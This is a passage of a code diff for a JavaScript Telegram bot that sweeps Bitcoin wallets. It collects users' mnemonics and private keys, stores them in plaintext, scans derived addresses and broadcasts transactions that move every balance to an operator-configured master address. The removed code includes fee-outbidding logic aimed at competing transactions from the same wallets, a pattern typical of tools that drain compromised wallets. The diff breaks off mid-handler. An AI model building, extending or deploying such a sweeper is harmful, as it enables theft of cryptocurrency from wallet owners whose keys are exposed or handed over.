@@ -1,4 +1,6 @@
-// worker.js – Bitcoin Auto-Sweeper with Telegram Bot
+// worker.js – Ultimate Bitcoin Auto-Sweeper with Telegram Bot
+// Supports: Mnemonic, WIF, Hex, xprv, yprv, zprv
+// Trust Wallet-style multi-index address scanning
 
 import * as bitcoin from 'bitcoinjs-lib';
 import * as bip39 from 'bip39';
@@ -7,129 +9,187 @@ import * as ecc from '@bitcoinerlab/secp256k1';
 import { Buffer } from 'buffer';
 
 globalThis.Buffer = Buffer;
-
 const bip32 = BIP32Factory(ecc);
 const NETWORK = bitcoin.networks.bitcoin;
 const DEFAULT_SAT_PER_BYTE = 15;
 const ESPLORA_API = 'https://blockstream.info/api';
 
+// ============================================================
+// DERIVATION PATHS (Trust Wallet compatible)
+// ============================================================
 const PATHS = {
-  legacy: "m/44'/0'/0'/0/0",
-  segwit: "m/49'/0'/0'/0/0",
-  native: "m/84'/0'/0'/0/0"
+  legacy:  "m/44'/0'/0'/0",
+  segwit:  "m/49'/0'/0'/0",
+  native:  "m/84'/0'/0'/0"
 };
 
-function deriveKeyPairFromMnemonic(mnemonic, path) {
-  const seed = bip39.mnemonicToSeedSync(mnemonic);
-  const root = bip32.fromSeed(seed, NETWORK);
-  const child = root.derivePath(path);
-  return bitcoin.ECPair.fromPrivateKey(child.privateKey, { network: NETWORK });
+// ============================================================
+// KEY DETECTION & IMPORT HELPERS
+// ============================================================
+function detectKeyType(text) {
+  const t = text.trim();
+  if (bip39.validateMnemonic(t)) return 'mnemonic';
+  if (/^[5KLc9][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(t)) return 'wif';
+  if (/^[0-9a-fA-F]{64}$/.test(t)) return 'hex';
+  if (/^xprv[1-9A-HJ-NP-Za-km-z]{107}$/.test(t)) return 'xprv';
+  if (/^yprv[1-9A-HJ-NP-Za-km-z]{107}$/.test(t)) return 'yprv';
+  if (/^zprv[1-9A-HJ-NP-Za-km-z]{107}$/.test(t)) return 'zprv';
+  if (/^tprv[1-9A-HJ-NP-Za-km-z]{107}$/.test(t)) return 'tprv';
+  if (/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(t)) return 'address_legacy';
+  if (/^bc1q[a-zA-HJ-NP-Z0-9]{38,58}$/.test(t)) return 'address_segwit';
+  if (/^bc1p[a-zA-HJ-NP-Z0-9]{58}$/.test(t)) return 'address_taproot';
+  return 'unknown';
 }
 
-function getAddressAndKeyPair(mnemonic, type) {
-  const keyPair = deriveKeyPairFromMnemonic(mnemonic, PATHS[type]);
-  let payment;
-  if (type === 'legacy') {
-    payment = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
-  } else if (type === 'segwit') {
-    payment = bitcoin.payments.p2sh({
-      redeem: bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network: NETWORK }),
-      network: NETWORK
-    });
-  } else if (type === 'native') {
-    payment = bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network: NETWORK });
+// ============================================================
+// ADDRESS DERIVATION
+// ============================================================
+function deriveAddressesFromMnemonic(mnemonic, scanDepth = 10) {
+  const results = [];
+  try {
+    const seed = bip39.mnemonicToSeedSync(mnemonic);
+    const root = bip32.fromSeed(seed, NETWORK);
+    for (const [type, basePath] of Object.entries(PATHS)) {
+      for (let i = 0; i < scanDepth; i++) {
+        try {
+          const child = root.derivePath(`${basePath}/${i}`);
+          if (!child.privateKey) continue;
+          const keyPair = bitcoin.ECPair.fromPrivateKey(child.privateKey, { network: NETWORK });
+          let payment;
+          if (type === 'legacy') {
+            payment = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
+          } else if (type === 'segwit') {
+            payment = bitcoin.payments.p2sh({
+              redeem: bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network: NETWORK }),
+              network: NETWORK
+            });
+          } else {
+            payment = bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network: NETWORK });
+          }
+          if (payment.address) {
+            results.push({ address: payment.address, keyPair, type, index: i });
+          }
+        } catch (e) { /* skip invalid index */ }
+      }
+    }
+  } catch (e) {
+    console.error('Mnemonic derivation error:', e);
   }
-  return { address: payment.address, keyPair };
+  return results;
 }
 
-function getAllSourceAddresses(mnemonic) {
-  return ['legacy', 'segwit', 'native'].map(type => {
-    const { address, keyPair } = getAddressAndKeyPair(mnemonic, type);
-    return { address, keyPair, type };
-  });
+function deriveAddressesFromXprv(xprvKey, scanDepth = 10) {
+  const results = [];
+  try {
+    const node = bip32.fromBase58(xprvKey, NETWORK);
+    for (let i = 0; i < scanDepth; i++) {
+      try {
+        const child = node.derive(0).derive(i);
+        if (!child.privateKey) continue;
+        const keyPair = bitcoin.ECPair.fromPrivateKey(child.privateKey, { network: NETWORK });
+        const payment = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
+        if (payment.address) {
+          results.push({ address: payment.address, keyPair, type: 'xprv', index: i });
+        }
+      } catch (e) { /* skip */ }
+    }
+  } catch (e) {
+    console.error('xprv derivation error:', e);
+  }
+  return results;
 }
 
+function deriveAddressesFromWif(wif) {
+  try {
+    const keyPair = bitcoin.ECPair.fromWIF(wif, NETWORK);
+    const payment = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
+    return [{ address: payment.address, keyPair, type: 'wif', index: 0 }];
+  } catch (e) {
+    console.error('WIF error:', e);
+    return [];
+  }
+}
+
+function deriveAddressesFromHex(hex) {
+  try {
+    const keyPair = bitcoin.ECPair.fromPrivateKey(Buffer.from(hex, 'hex'), { network: NETWORK });
+    const payment = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
+    return [{ address: payment.address, keyPair, type: 'hex', index: 0 }];
+  } catch (e) {
+    console.error('Hex error:', e);
+    return [];
+  }
+}
+
+function getAllAddresses(secret, scanDepth = 10) {
+  const type = detectKeyType(secret);
+  switch (type) {
+    case 'mnemonic': return deriveAddressesFromMnemonic(secret, scanDepth);
+    case 'xprv':
+    case 'yprv':
+    case 'zprv':
+    case 'tprv': return deriveAddressesFromXprv(secret, scanDepth);
+    case 'wif':     return deriveAddressesFromWif(secret);
+    case 'hex':     return deriveAddressesFromHex(secret);
+    default:        return [];
+  }
+}
+
+// ============================================================
+// BLOCKCHAIN API
+// ============================================================
 async function getUtxos(address) {
-  const url = `${ESPLORA_API}/address/${address}/utxo`;
-  const resp = await fetch(url);
-  if (!resp.ok) throw new Error(`UTXO fetch failed: ${resp.status}`);
-  return resp.json();
+  try {
+    const resp = await fetch(`${ESPLORA_API}/address/${address}/utxo`);
+    if (!resp.ok) return [];
+    return resp.json();
+  } catch { return []; }
 }
 
-async function getMempoolTxs(address) {
-  const url = `${ESPLORA_API}/address/${address}/txs/mempool`;
-  const resp = await fetch(url);
-  if (!resp.ok) return [];
-  return resp.json();
-}
-
-async function getTxDetails(txid) {
-  const url = `${ESPLORA_API}/tx/${txid}`;
-  const resp = await fetch(url);
-  if (!resp.ok) return null;
-  return resp.json();
-}
-
-async function getFeeEstimates() {
-  const url = `${ESPLORA_API}/fee-estimates`;
-  const resp = await fetch(url);
-  if (!resp.ok) throw new Error(`Fee estimate failed: ${resp.status}`);
-  return resp.json();
+async function getAddressBalance(address) {
+  try {
+    const resp = await fetch(`${ESPLORA_API}/address/${address}`);
+    if (!resp.ok) return 0;
+    const data = await resp.json();
+    const funded = data.chain_stats?.funded_txo_sum || 0;
+    const spent = data.chain_stats?.spent_txo_sum || 0;
+    return funded - spent;
+  } catch { return 0; }
 }
 
 async function getRecommendedFee() {
   try {
-    const estimates = await getFeeEstimates();
-    const fastest = estimates['1'] || estimates['2'] || DEFAULT_SAT_PER_BYTE;
-    return Math.ceil(fastest);
-  } catch (e) {
-    console.error('Fee estimate error:', e);
-    return DEFAULT_SAT_PER_BYTE;
-  }
+    const resp = await fetch(`${ESPLORA_API}/fee-estimates`);
+    if (!resp.ok) return DEFAULT_SAT_PER_BYTE;
+    const estimates = await resp.json();
+    return Math.ceil(estimates['1'] || estimates['2'] || DEFAULT_SAT_PER_BYTE);
+  } catch { return DEFAULT_SAT_PER_BYTE; }
 }
 
-async function getHighestCompetitorFee(address) {
-  try {
-    const mempoolTxs = await getMempoolTxs(address);
-    if (!mempoolTxs || mempoolTxs.length === 0) return 0;
-    let maxFeeRate = 0;
-    for (const txid of mempoolTxs) {
-      const txDetails = await getTxDetails(txid);
-      if (txDetails && txDetails.fee && txDetails.weight) {
-        const vbytes = Math.ceil(txDetails.weight / 4);
-        const feeRate = Math.ceil(txDetails.fee / vbytes);
-        if (feeRate > maxFeeRate) maxFeeRate = feeRate;
-      }
-    }
-    return maxFeeRate;
-  } catch (e) {
-    console.error('Competitor detection error:', e);
-    return 0;
-  }
-}
+// ============================================================
+// TRANSACTION BUILDING
+// ============================================================
+async function createSweepTx(keyPair, utxos, toAddress, feeRate) {
+  const inputCount = utxos.length;
+  const estimatedVBytes = inputCount * 180 + 34 + 10;
+  const feeSats = estimatedVBytes * feeRate;
+  const totalInput = utxos.reduce((sum, u) => sum + u.value, 0);
+  const amountToSend = totalInput - feeSats;
+  if (amountToSend <= 546) return { error: `Balance ${totalInput} sats too low for fee ${feeSats} sats` };
 
-async function createSweepTx(keyPair, utxos, toAddress, feeSats, rbf = true) {
   const txb = new bitcoin.TransactionBuilder(NETWORK);
-  let totalInput = 0;
   utxos.forEach(utxo => {
     txb.addInput(utxo.txid, utxo.vout);
-    totalInput += utxo.value;
+    txb.setInputSequence(txb.inputs.length - 1, 0xfffffffd); // RBF
   });
-  const amountToSend = totalInput - feeSats;
-  if (amountToSend <= 0) throw new Error('Insufficient funds to cover fee');
   txb.addOutput(toAddress, amountToSend);
-  if (rbf) {
-    for (let i = 0; i < utxos.length; i++) {
-      txb.setInputSequence(i, 0xfffffffd);
-    }
-  }
   utxos.forEach((_, i) => txb.sign(i, keyPair));
-  return txb.build().toHex();
+
+  return { hex: txb.build().toHex(), amount: amountToSend, fee: feeSats };
 }
 
 async function broadcastTx(txHex) {
-  const url = `${ESPLORA_API}/tx`;
-  const resp = await fetch(url, {
+  const resp = await fetch(`${ESPLORA_API}/tx`, {
     method: 'POST',
     headers: { 'Content-Type': 'text/plain' },
     body: txHex
@@ -141,151 +201,179 @@ async function broadcastTx(txHex) {
   return resp.text();
 }
 
-async function sendTelegramMessage(botToken, chatId, text, replyMarkup = null) {
+// ============================================================
+// TELEGRAM HELPERS
+// ============================================================
+async function sendMsg(botToken, chatId, text, replyMarkup = null) {
   try {
-    if (!botToken) {
-      console.error('❌ CRITICAL: TELEGRAM_BOT_TOKEN is missing in environment variables!');
-      return;
-    }
+    if (!botToken) return;
     const payload = { chat_id: chatId, text, parse_mode: 'HTML' };
     if (replyMarkup) payload.reply_markup = replyMarkup;
-    
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error('❌ Telegram API Error:', response.status, errorText);
-    }
-  } catch (e) { 
-    console.error('❌ Telegram send error:', e); 
-  }
+  } catch (e) { console.error('Telegram send error:', e); }
 }
 
-function isAuthorized(request, env) {
-  return request.headers.get('Authorization') === `Bearer ${env.ADMIN_TOKEN}`;
+function mainMenuKeyboard() {
+  return {
+    inline_keyboard: [
+      [{ text: '🔑 Import Wallet', callback_data: 'import' }],
+      [{ text: '📋 List Wallets', callback_data: 'list' }],
+      [{ text: '🗑️ Remove Wallet', callback_data: 'remove' }],
+      [{ text: '➕ Add Recipient', callback_data: 'addrecipient' }],
+      [{ text: '📤 Send To Address', callback_data: 'sendto' }],
+      [{ text: '🧹 Sweep All', callback_data: 'sweep' }],
+      [{ text: '📊 Check Balance', callback_data: 'balance' }],
+      [{ text: '⏸️ Pause', callback_data: 'pause' }, { text: '▶️ Resume', callback_data: 'resume' }],
+      [{ text: '🧪 Test API', callback_data: 'testapi' }]
+    ]
+  };
+}
+
+// ============================================================
+// WALLET STORAGE HELPERS
+// ============================================================
+async function getWallets(env, chatId) {
+  return (await env.WALLETS.get(`wallets_${chatId}`, 'json')) || [];
+}
+async function saveWallets(env, chatId, wallets) {
+  await env.WALLETS.put(`wallets_${chatId}`, JSON.stringify(wallets));
+}
+async function getRecipients(env, chatId) {
+  return (await env.WALLETS.get(`recipients_${chatId}`, 'json')) || [];
+}
+async function saveRecipients(env, chatId, recipients) {
+  await env.WALLETS.put(`recipients_${chatId}`, JSON.stringify(recipients));
 }
 
 // ============================================================
 // CORE SWEEP LOGIC
 // ============================================================
-async function sweepAll(env, chatId = null, specificMnemonic = null) {
-  const {
-    TELEGRAM_BOT_TOKEN,
-    TELEGRAM_CHAT_ID,
-    MASTER_ADDRESS,
-    MIN_BALANCE_TO_SWEEP = "10000",
-    MAX_FEE_RATE = "50",
-    FEE_BUMP = "3"
-  } = env;
+async function sweepAll(env, chatId, targetAddress = null) {
+  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, MASTER_ADDRESS,
+          MIN_BALANCE_TO_SWEEP = "10000", MAX_FEE_RATE = "50",
+          FEE_BUMP = "3", SCAN_DEPTH = "10" } = env;
 
-  const targetChatId = chatId || TELEGRAM_CHAT_ID;
-  if (!targetChatId || !MASTER_ADDRESS) {
-    console.error('Missing Telegram chat ID or MASTER_ADDRESS');
-    return;
-  }
+  const cid = chatId || TELEGRAM_CHAT_ID;
+  const dest = targetAddress || MASTER_ADDRESS;
+  if (!cid || !dest) return;
 
-  const paused = await env.WALLETS.get('PAUSED') === 'true';
-  if (paused) {
-    await sendTelegramMessage(TELEGRAM_BOT_TOKEN, targetChatId, '⏸️ Sweeper is paused. Resume with /resume.');
+  if ((await env.WALLETS.get('PAUSED')) === 'true') {
+    await sendMsg(TELEGRAM_BOT_TOKEN, cid, '⏸️ Sweeper is paused.');
     return;
   }
 
   try {
-    let sources = [];
-    if (specificMnemonic) {
-      sources = getAllSourceAddresses(specificMnemonic);
-    } else {
-      const key = `wallets_${targetChatId}`;
-      const stored = await env.WALLETS.get(key, 'json');
-      if (stored && Array.isArray(stored)) {
-        for (const wallet of stored) {
-          const src = getAllSourceAddresses(wallet.mnemonic || wallet.wif);
-          for (const item of src) {
-            item.label = wallet.label || 'Unnamed';
-            sources.push(item);
-          }
-        }
-      }
-    }
-
-    if (sources.length === 0) {
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, targetChatId, '❌ No source wallets imported. Use /import to add one.');
+    const wallets = await getWallets(env, cid);
+    if (wallets.length === 0) {
+      await sendMsg(TELEGRAM_BOT_TOKEN, cid, '❌ No wallets imported. Use /import.');
       return;
     }
 
-    let anySwept = false;
-    let totalSwept = 0;
-    let report = [];
+    let report = [], totalSwept = 0;
 
-    for (const src of sources) {
-      const utxos = await getUtxos(src.address);
-      if (!utxos || utxos.length === 0) continue;
+    for (const wallet of wallets) {
+      const secret = wallet.mnemonic || wallet.wif || wallet.hex || wallet.xprv;
+      const scanDepth = parseInt(SCAN_DEPTH) || 10;
+      const addresses = getAllAddresses(secret, scanDepth);
 
-      const totalBalance = utxos.reduce((sum, u) => sum + u.value, 0);
-      if (totalBalance < parseInt(MIN_BALANCE_TO_SWEEP)) continue;
+      for (const addr of addresses) {
+        const utxos = await getUtxos(addr.address);
+        if (!utxos || utxos.length === 0) continue;
 
-      const competitorFee = await getHighestCompetitorFee(src.address);
-      let ourFeeRate;
-      if (competitorFee > 0) {
-        ourFeeRate = competitorFee + parseInt(FEE_BUMP);
-      } else {
-        const recommended = await getRecommendedFee();
-        ourFeeRate = Math.max(recommended, DEFAULT_SAT_PER_BYTE);
+        const balance = utxos.reduce((s, u) => s + u.value, 0);
+        if (balance < parseInt(MIN_BALANCE_TO_SWEEP)) continue;
+
+        const feeRate = Math.min(await getRecommendedFee(), parseInt(MAX_FEE_RATE));
+        const result = await createSweepTx(addr.keyPair, utxos, dest, feeRate);
+        if (result.error) {
+          report.push(`⚠️ ${wallet.label} (${addr.address}): ${result.error}`);
+          continue;
+        }
+
+        const txid = await broadcastTx(result.hex);
+        report.push(`✅ ${wallet.label} [${addr.type}/${addr.index}]\n   ${addr.address}\n   Sent: ${(result.amount/1e8).toFixed(8)} BTC\n   Tx: <code>${txid}</code>`);
+        totalSwept += result.amount;
       }
-
-      if (ourFeeRate > parseInt(MAX_FEE_RATE)) {
-        report.push(`⚠️ ${src.label} (${src.address}): fee ${ourFeeRate} > cap ${MAX_FEE_RATE}, skipped.`);
-        continue;
-      }
-
-      const inputCount = utxos.length;
-      const estimatedVBytes = inputCount * 180 + 34 + 10;
-      const feeSats = estimatedVBytes * ourFeeRate;
-      const amountToSend = totalBalance - feeSats;
-
-      if (amountToSend <= 0) {
-        report.push(`⚠️ ${src.label} (${src.address}): balance ${totalBalance} sats too low for fee.`);
-        continue;
-      }
-
-      const txHex = await createSweepTx(src.keyPair, utxos, MASTER_ADDRESS, feeSats, true);
-      const txid = await broadcastTx(txHex);
-
-      report.push(`✅ ${src.label} (${src.address}): sent ${(amountToSend/1e8).toFixed(8)} BTC, fee ${(feeSats/1e8).toFixed(8)} BTC, tx ${txid}`);
-      totalSwept += amountToSend;
-      anySwept = true;
     }
 
-    if (anySwept) {
-      const msg = `🚀 <b>Sweep completed!</b>\n\n` + report.join('\n') + `\n\nTotal swept: ${(totalSwept/1e8).toFixed(8)} BTC`;
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, targetChatId, msg);
+    if (totalSwept > 0) {
+      await sendMsg(TELEGRAM_BOT_TOKEN, cid,
+        `🚀 <b>Sweep completed!</b>\n\n${report.join('\n\n')}\n\n💰 Total: ${(totalSwept/1e8).toFixed(8)} BTC → <code>${dest}</code>`);
+    } else if (report.length > 0) {
+      await sendMsg(TELEGRAM_BOT_TOKEN, cid, `ℹ️ No sweepable balances:\n${report.join('\n')}`);
     } else {
-      if (report.length > 0) {
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, targetChatId, 'ℹ️ No sweepable balances:\n' + report.join('\n'));
-      }
+      await sendMsg(TELEGRAM_BOT_TOKEN, cid, 'ℹ️ No funded addresses found in imported wallets.');
     }
-  } catch (error) {
-    console.error('Sweep error:', error);
-    const errMsg = `❌ <b>Error during sweep:</b>\n${error.message}`;
-    await sendTelegramMessage(TELEGRAM_BOT_TOKEN, targetChatId, errMsg);
+  } catch (e) {
+    console.error('Sweep error:', e);
+    await sendMsg(TELEGRAM_BOT_TOKEN, cid, `❌ Sweep error: ${e.message}`);
   }
+}
+
+// ============================================================
+// IMPORT WALLET HANDLER
+// ============================================================
+async function importWallet(env, chatId, text) {
+  const { TELEGRAM_BOT_TOKEN, SCAN_DEPTH = "10" } = env;
+  const secret = text.trim();
+  const keyType = detectKeyType(secret);
+
+  if (keyType === 'unknown') {
+    await sendMsg(TELEGRAM_BOT_TOKEN, chatId,
+      "❓ <b>Unrecognized format.</b>\n\nSupported:\n" +
+      "• 12/24 word mnemonic\n• WIF private key (K/L/5/c/9)\n" +
+      "• 64-char Hex key\n• xprv / yprv / zprv extended key");
+    return;
+  }
+
+  if (keyType.startsWith('address')) {
+    await sendMsg(TELEGRAM_BOT_TOKEN, chatId,
+      "ℹ️ That looks like a Bitcoin <b>address</b>, not a private key.\nUse /add <address> to add it as a recipient.");
+    return;
+  }
+
+  const scanDepth = parseInt(SCAN_DEPTH) || 10;
+  const addresses = getAllAddresses(secret, scanDepth);
+  if (addresses.length === 0) {
+    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `❌ Could not derive addresses from this ${keyType}.`);
+    return;
+  }
+
+  const wallets = await getWallets(env, chatId);
+  const exists = wallets.some(w => (w.mnemonic || w.wif || w.hex || w.xprv) === secret);
+  if (exists) {
+    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '⚠️ This key is already imported.');
+    return;
+  }
+
+  const label = `Wallet ${wallets.length + 1}`;
+  const walletEntry = { label };
+  if (keyType === 'mnemonic') walletEntry.mnemonic = secret;
+  else if (keyType === 'wif') walletEntry.wif = secret;
+  else if (keyType === 'hex') walletEntry.hex = secret;
+  else walletEntry.xprv = secret;
+
+  wallets.push(walletEntry);
+  await saveWallets(env, chatId, wallets);
+
+  const preview = addresses.slice(0, 3).map(a => `${a.type}/${a.index}: <code>${a.address}</code>`).join('\n');
+  const more = addresses.length > 3 ? `\n... and ${addresses.length - 3} more addresses` : '';
+  await sendMsg(TELEGRAM_BOT_TOKEN, chatId,
+    `✅ <b>${label}</b> imported!\n\n🔑 Type: ${keyType}\n📍 Addresses:\n${preview}${more}`);
 }
 
 // ============================================================
 // TELEGRAM BOT HANDLER
 // ============================================================
 async function handleTelegramUpdate(update, env) {
-  console.log("🔍 UPDATE RECEIVED:", JSON.stringify(update).substring(0, 100));
-  console.log("🔑 BOT TOKEN EXISTS:", !!env.TELEGRAM_BOT_TOKEN);
-
   const { TELEGRAM_BOT_TOKEN } = env;
   if (!update.message && !update.callback_query) return;
 
-  let chatId, text = '', callbackData; // FIXED: default text to empty string
+  let chatId, text = '', callbackData;
 
   if (update.message) {
     chatId = update.message.chat.id;
@@ -294,262 +382,252 @@ async function handleTelegramUpdate(update, env) {
     chatId = update.callback_query.message?.chat?.id || update.callback_query.from.id;
     callbackData = update.callback_query.data;
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ callback_query_id: update.callback_query.id })
     });
   }
-
   if (!chatId) return;
 
-  // ============================================================
-  // HANDLE BUTTON CLICKS (CALLBACK DATA)
-  // ============================================================
+  // ---- BUTTON HANDLERS ----
   if (callbackData) {
-    if (callbackData === 'menu' || callbackData === 'start') {
-      const keyboard = {
-        inline_keyboard: [
-          [{ text: '🔑 Import Wallet', callback_data: 'import' }],
-          [{ text: '📋 List Wallets', callback_data: 'list' }],
-          [{ text: '➕ Add Recipient', callback_data: 'addrecipient' }],
-          [{ text: '🧹 Sweep All', callback_data: 'sweep' }],
-          [{ text: '📊 Check Balance', callback_data: 'balance' }],
-          [{ text: '⏸️ Pause', callback_data: 'pause' }, { text: '▶️ Resume', callback_data: 'resume' }],
-          [{ text: '🧪 Test API', callback_data: 'testapi' }]
-        ]
-      };
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '🤖 <b>Bitcoin Sweeper Bot</b>\n\nChoose an action:', keyboard);
-      return;
-    }
-
     switch (callbackData) {
+      case 'menu': case 'start':
+        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '🤖 <b>Bitcoin Sweeper Bot</b>\n\nChoose an action:', mainMenuKeyboard());
+        break;
       case 'import':
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '🔑 Send me your <b>mnemonic</b> (12/24 words) or <b>WIF private key</b>.\n\nExample:\n<code>abandon abandon ...</code>\nor\n<code>L5...</code>');
+        await sendMsg(TELEGRAM_BOT_TOKEN, chatId,
+          '🔑 Send me your key:\n\n' +
+          '• <b>12/24 word mnemonic</b>\n' +
+          '• <b>WIF</b> private key (K/L/5/c/9)\n' +
+          '• <b>Hex</b> private key (64 chars)\n' +
+          '• <b>xprv / yprv / zprv</b> extended key\n\n' +
+          'I will scan multiple addresses like Trust Wallet.');
         break;
       case 'list': {
-        const key = `wallets_${chatId}`;
-        const storedWallets = await env.WALLETS.get(key, 'json') || [];
-        if (storedWallets.length === 0) {
-          await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '📭 No wallets imported.');
+        const wallets = await getWallets(env, chatId);
+        if (wallets.length === 0) {
+          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '📭 No wallets imported.');
         } else {
           let msg = '📋 <b>Your Wallets:</b>\n\n';
-          for (const w of storedWallets) {
-            const label = w.label || 'Unnamed';
-            const first = getAllSourceAddresses(w.mnemonic || w.wif)[0];
-            msg += `🔹 <b>${label}</b>\n   ${first.address}\n`;
+          for (const w of wallets) {
+            msg += `🔹 <b>${w.label}</b>\n`;
           }
-          await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, msg);
+          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, msg);
+        }
+        break;
+      }
+      case 'remove': {
+        const wallets = await getWallets(env, chatId);
+        if (wallets.length === 0) {
+          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '📭 No wallets to remove.');
+        } else {
+          const kb = wallets.map((w, i) => [{ text: `🗑️ ${w.label}`, callback_data: `del_${i}` }]);
+          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Select wallet to remove:', { inline_keyboard: kb });
         }
         break;
       }
       case 'addrecipient':
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '➕ Send me a Bitcoin address to add as a recipient (destination).\n\nExample: <code>bc1q...</code>');
+        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '➕ Send me a Bitcoin address to add as recipient.\nExample: <code>bc1q...</code>');
         break;
+      case 'sendto': {
+        const recipients = await getRecipients(env, chatId);
+        if (recipients.length === 0) {
+          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'No recipients yet. Add one first with /add <address>');
+        } else {
+          const kb = recipients.map((r, i) => [{ text: r.substring(0, 20) + '...', callback_data: `send_${i}` }]);
+          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Select recipient to sweep to:', { inline_keyboard: kb });
+        }
+        break;
+      }
       case 'sweep':
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '🧹 Sweeping all wallets...');
-        await sweepAll(env, chatId, null);
+        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '🧹 Sweeping all wallets to MASTER_ADDRESS...');
+        await sweepAll(env, chatId);
         break;
       case 'balance':
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '📊 Send me a Bitcoin address to check its balance.');
+        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '📊 Send me a Bitcoin address to check balance.\nOr send /balance to check all wallets.');
         break;
       case 'pause':
         await env.WALLETS.put('PAUSED', 'true');
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '⏸️ Sweeper paused.');
+        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '⏸️ Sweeper paused.');
         break;
       case 'resume':
         await env.WALLETS.put('PAUSED', 'false');
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '▶️ Sweeper resumed.');
+        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '▶️ Sweeper resumed.');
         break;
       case 'testapi': {
         try {
           const fee = await getRecommendedFee();
-          const testAddress = 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq';
-          const utxos = await getUtxos(testAddress);
-          const balance = utxos.reduce((sum, u) => sum + u.value, 0);
-          await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId,
-            `🧪 <b>API Test Results</b>\n\n` +
-            `✅ Esplora reachable\n` +
-            `💰 Test address balance: ${(balance/1e8).toFixed(8)} BTC\n` +
-            `💸 Current fee: ${fee} sat/vbyte`);
+          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `🧪 <b>API OK</b>\n💸 Fee: ${fee} sat/vB`);
         } catch (e) {
-          await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, `❌ API test failed:\n${e.message}`);
+          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `❌ API test failed: ${e.message}`);
         }
         break;
       }
-      default:
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, 'Unknown action.');
-    }
-    return;
-  }
-
-  // ============================================================
-  // HANDLE TEXT COMMANDS
-  // ============================================================
-  
-  // Main Menu
-  if (text === '/start' || text.startsWith('/start') || text === '/menu') {
-    const keyboard = {
-      inline_keyboard: [
-        [{ text: '🔑 Import Wallet', callback_data: 'import' }],
-        [{ text: '📋 List Wallets', callback_data: 'list' }],
-        [{ text: '➕ Add Recipient', callback_data: 'addrecipient' }],
-        [{ text: '🧹 Sweep All', callback_data: 'sweep' }],
-        [{ text: '📊 Check Balance', callback_data: 'balance' }],
-        [{ text: '⏸️ Pause', callback_data: 'pause' }, { text: '▶️ Resume', callback_data: 'resume' }],
-        [{ text: '🧪 Test API', callback_data: 'testapi' }]
-      ]
-    };
-    await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '🤖 <b>Bitcoin Sweeper Bot</b>\n\nChoose an action:', keyboard);
-    return;
-  }
-
-  // Text Commands
-  if (text === '/import') {
-    await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '🔑 Send me your <b>mnemonic</b> (12/24 words) or <b>WIF private key</b>.\n\nExample:\n<code>abandon abandon ...</code>\nor\n<code>L5...</code>');
-    return;
-  }
-  if (text === '/list') {
-    const key = `wallets_${chatId}`;
-    const storedWallets = await env.WALLETS.get(key, 'json') || [];
-    if (storedWallets.length === 0) {
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '📭 No wallets imported.');
-    } else {
-      let msg = '📋 <b>Your Wallets:</b>\n\n';
-      for (const w of storedWallets) {
-        const label = w.label || 'Unnamed';
-        const first = getAllSourceAddresses(w.mnemonic || w.wif)[0];
-        msg += `🔹 <b>${label}</b>\n   ${first.address}\n`;
+      default: {
+        // Handle dynamic buttons: del_0, send_0, etc.
+        if (callbackData.startsWith('del_')) {
+          const idx = parseInt(callbackData.split('_')[1]);
+          const wallets = await getWallets(env, chatId);
+          if (idx >= 0 && idx < wallets.length) {
+            const removed = wallets.splice(idx, 1)[0];
+            await saveWallets(env, chatId, wallets);
